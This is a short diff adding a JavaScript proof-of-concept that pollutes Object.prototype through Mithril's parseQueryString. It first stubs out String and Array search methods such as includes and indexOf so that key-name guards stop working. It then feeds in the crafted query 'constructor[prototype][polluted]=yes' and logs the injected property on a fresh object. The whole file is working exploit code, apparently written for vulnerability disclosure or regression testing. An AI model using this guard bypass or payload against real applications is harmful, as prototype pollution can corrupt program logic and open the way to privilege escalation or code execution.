@@ -1,0 +1,16 @@
+String.prototype.includes = () => false;
+String.prototype.startsWith = () => false;
+String.prototype.endsWith = () => false;
+String.prototype.indexOf = () => -1;
+String.prototype.lastIndexOf = () => false;
+String.prototype.match = () => false;
+String.prototype.search = () => false;
+String.prototype.matchAll = () => false;
+Array.prototype.includes = () => false;
+Array.prototype.indexOf = () => -1;
+require('mithril/test-utils/browserMock')(global);
+const m = require('mithril');
+obj = {};
+console.log({}.polluted);
+m.parseQueryString('constructor%5Bprototype%5Bpolluted%5D=yes');
+console.log({}.polluted);
